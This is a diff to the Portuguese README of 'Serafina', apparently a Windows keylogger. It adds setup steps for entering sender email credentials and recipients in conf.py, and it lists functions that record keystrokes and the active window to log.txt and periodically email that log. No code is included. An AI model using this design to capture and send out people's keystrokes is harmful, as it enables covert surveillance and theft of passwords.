@@ -14,7 +14,17 @@ $ pip install pywin32
 ```
 ---
 
-## Functions:
+### Config. ###
+* Open conf.py
+![alt text](https://raw.githubusercontent.com/xxdf/Serafina/master/how_to_conf.png)
+* set on line 6: Subject (email);
+* set on line 7: Email content;
+* set on line 8: your email (sender)
+* set on line 9: your pass (sender)
+* set on line 10: Recipients
+* set on line 11: Key to Close/Stop Thread Serafina()
+
+### Functions: ###
 * `get_current_process()` : Funcao responsável por pegar o processo atual (Janela aberta em prioridade);
 * `KeyStroke(event)` : Responsável por captar as teclas pressionadas, e gravá-las no arquivo de `log.txt`;
 * `serafina()` : Nome carinhosamente dado ao programa, e a função que, consiste em ser assumida por uma *Thread* que, de tempo em tempo acessa um email no qual os dados sãs especificados no escopo do programa, e envia o arquivo de `log.txt` gravado e atualizado pelas demais funcoes;
@@ -23,7 +33,7 @@ $ pip install pywin32
 * `adiciona_anexo(msg, filename)` : Recebe por parametro `msg` e `filename`, que corresponde aos dados da mensagem a ser enviada, e ao nome do arquivo que será anexado, deve estar dentro da pasta do executável;
 ---
 
-## Imports:
+### Imports: ###
 * Os imports é onde sao feitas as declarações das bibliotecas que serão usadas no decorrer do programa;
 * Função `Thread` da biblioteca `threading`, responsável por criar e gerenciar a thread criada para enviar email;
 * Função `sleep` da biblioteca `time`, responsável por fazer com que o S.O. espere um tempo especificado para prosseguir com a execução;
